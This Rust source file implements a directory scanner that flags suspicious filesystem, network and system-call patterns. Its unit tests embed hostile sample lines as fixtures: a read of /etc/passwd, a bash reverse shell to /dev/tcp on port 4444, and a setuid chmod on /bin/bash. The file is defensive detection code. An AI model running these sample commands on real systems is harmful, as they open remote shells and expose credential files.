use crate::analyzer::behavioral_ast::BehavioralAstAnalyzer;
use crate::analyzer::models::DetectionMatch;
use crate::database::models::PatternType;
use crate::analyzer::patterns::{
	FILESYSTEM_PATTERNS, NETWORK_CONN_PATTERNS, SYSCALL_PATTERNS,
};
use anyhow::Result;
use std::fs;
use std::path::Path;
use walkdir::WalkDir;

pub struct BehavioralAnalyzer;

impl BehavioralAnalyzer {
	pub fn scan_directory(source_dir: &Path) -> Result<Vec<DetectionMatch>> {
		let mut matches = Vec::new();

		let skip_dirs = [
			"node_modules",
			".git",
			".hg",
			"dist",
			"build",
			"target",
			".cache",
			".next",
			"__pycache__",
			".venv",
			".env",
		];

		for entry in WalkDir::new(source_dir)
			.into_iter()
			.filter_map(|e| e.ok())
			.filter(|e| {
				!skip_dirs.iter().any(|skip| {
					e.path()
						.components()
						.any(|c| c.as_os_str().to_string_lossy() == *skip)
				})
			})
		{
			let path = entry.path();

			// Only scan source files
			if !should_scan_file(path) {
				continue;
			}

			if let Ok(content) = fs::read_to_string(path) {
				let file_path_str = path.to_string_lossy().to_string();

				// Check filesystem patterns
				for (line_num, line) in content.lines().enumerate() {
					for pattern in FILESYSTEM_PATTERNS.iter() {
						if pattern.regex.is_match(line) {
							matches.push(DetectionMatch {
								pattern_type: PatternType::FilesystemAccess,
								description: format!("Suspicious filesystem access: {}", pattern.name),
								file_path: Some(file_path_str.clone()),
								line_number: Some((line_num + 1) as u32),
								code_snippet: Some(line.chars().take(120).collect()),
								confidence: pattern.confidence,
							});
						}
					}

					// Check network patterns
					for pattern in NETWORK_CONN_PATTERNS.iter() {
						if pattern.regex.is_match(line) {
							matches.push(DetectionMatch {
								pattern_type: PatternType::NetworkConnection,
								description: format!("Suspicious network activity: {}", pattern.name),
								file_path: Some(file_path_str.clone()),
								line_number: Some((line_num + 1) as u32),
								code_snippet: Some(line.chars().take(120).collect()),
								confidence: pattern.confidence,
							});
						}
					}

					// Check syscall patterns
					for pattern in SYSCALL_PATTERNS.iter() {
						if pattern.regex.is_match(line) {
							matches.push(DetectionMatch {
								pattern_type: PatternType::SystemCall,
								description: format!("Suspicious system call: {}", pattern.name),
								file_path: Some(file_path_str.clone()),
								line_number: Some((line_num + 1) as u32),
								code_snippet: Some(line.chars().take(120).collect()),
								confidence: pattern.confidence,
							});
						}
					}
				}
			}
		}

		Ok(matches)
	}

	/// Combines regex pattern matching (Phase 2A) with AST-based semantic
	/// analysis (Phase 2B). Produces higher-confidence findings by ignoring
	/// code in comments and verifying actual call arguments.
	pub fn scan_directory_with_ast(source_dir: &Path) -> Result<Vec<DetectionMatch>> {
		let mut matches = Self::scan_directory(source_dir)?;

		let skip_dirs = [
			"node_modules", ".git", ".hg", "dist", "build", "target",
			".cache", ".next", "__pycache__", ".venv", ".env",
		];

		for entry in WalkDir::new(source_dir)
			.into_iter()
			.filter_map(|e| e.ok())
			.filter(|e| {
				!skip_dirs.iter().any(|skip| {
					e.path()
						.components()
						.any(|c| c.as_os_str().to_string_lossy() == *skip)
				})
			})
		{
			let path = entry.path();

			if !should_scan_ast(path) {
				continue;
			}

			if let Ok(content) = fs::read_to_string(path) {
				let file_path_str = path.to_string_lossy().to_string();
				let ast_findings = BehavioralAstAnalyzer::analyze(&content, &file_path_str);
				matches.extend(ast_findings);
			}
		}

		Ok(matches)
	}
}

fn should_scan_file(path: &Path) -> bool {
	match path.extension() {
		Some(ext) => {
			let ext_str = ext.to_string_lossy().to_lowercase();
			matches!(
				ext_str.as_str(),
				"js" | "mjs" | "cjs" | "ts" | "mts" | "cts" | "json" | "py" | "go"
					| "rs" | "toml" | "yaml" | "yml" | "sh" | "bash" | "zsh" | "rb"
					| "php" | "java" | "c" | "cpp" | "h" | "hpp"
			)
		}
		None => false,
	}
}

fn should_scan_ast(path: &Path) -> bool {
	match path.extension() {
		Some(ext) => {
			let ext_str = ext.to_string_lossy().to_lowercase();
			matches!(ext_str.as_str(), "js" | "mjs" | "cjs" | "ts" | "mts" | "cts" | "py" | "go")
		}
		None => false,
	}
}

#[cfg(test)]
mod tests {
	use super::*;
	use std::fs::File;
	use std::io::Write;
	use tempfile::TempDir;

	#[test]
	fn detects_etc_passwd_read() -> Result<()> {
		let temp_dir = TempDir::new()?;
		let file_path = temp_dir.path().join("test.js");
		let mut file = File::create(&file_path)?;
		writeln!(file, "const data = fs.readFileSync('/etc/passwd', 'utf8');")?;

		let matches = BehavioralAnalyzer::scan_directory(temp_dir.path())?;
		assert!(!matches.is_empty());
		assert_eq!(
			matches[0].pattern_type,
			PatternType::FilesystemAccess
		);
		assert!(matches[0].confidence >= 0.9);
		Ok(())
	}

	#[test]
	fn detects_reverse_shell() -> Result<()> {
		let temp_dir = TempDir::new()?;
		let file_path = temp_dir.path().join("test.js");
		let mut file = File::create(&file_path)?;
		writeln!(file, "const shell = 'bash -i >& /dev/tcp/192.168.1.1/4444';")?;

		let matches = BehavioralAnalyzer::scan_directory(temp_dir.path())?;
		assert!(!matches.is_empty());
		assert!(matches
			.iter()
			.any(|m| m.pattern_type == PatternType::NetworkConnection));
		Ok(())
	}

	#[test]
	fn detects_privilege_escalation() -> Result<()> {
		let temp_dir = TempDir::new()?;
		let file_path = temp_dir.path().join("test.sh");
		let mut file = File::create(&file_path)?;
		writeln!(file, "sudo chmod 4000 /bin/bash")?;

		let matches = BehavioralAnalyzer::scan_directory(temp_dir.path())?;
		assert!(!matches.is_empty());
		assert!(matches
			.iter()
			.any(|m| m.pattern_type == PatternType::SystemCall));
		Ok(())
	}

	#[test]
	fn no_false_positive_on_normal_files() -> Result<()> {
		let temp_dir = TempDir::new()?;
		let file_path = temp_dir.path().join("normal.js");
		let mut file = File::create(&file_path)?;
		writeln!(file, "const config = require('./config.json');")?;
		writeln!(file, "console.log('Hello World');")?;

		let matches = BehavioralAnalyzer::scan_directory(temp_dir.path())?;
		// Should have minimal or no high-confidence detections
		let high_conf = matches
			.iter()
			.filter(|m| m.confidence > 0.75)
			.collect::<Vec<_>>();
		assert!(high_conf.is_empty());
		Ok(())
	}
}
